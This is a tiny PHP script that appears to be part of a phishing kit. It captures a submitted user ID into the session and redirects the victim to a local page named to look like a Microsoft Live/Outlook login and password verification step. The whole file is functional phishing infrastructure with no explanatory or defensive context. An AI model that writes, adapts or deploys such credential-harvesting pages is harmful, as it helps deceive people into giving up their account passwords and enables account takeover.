<?php
header ('Location:login.live.com_login_verify_credentials_outlook.contraseña.html');
$email=$_POST['userid'];
session_start();
$_SESSION['email'] = $email;
?>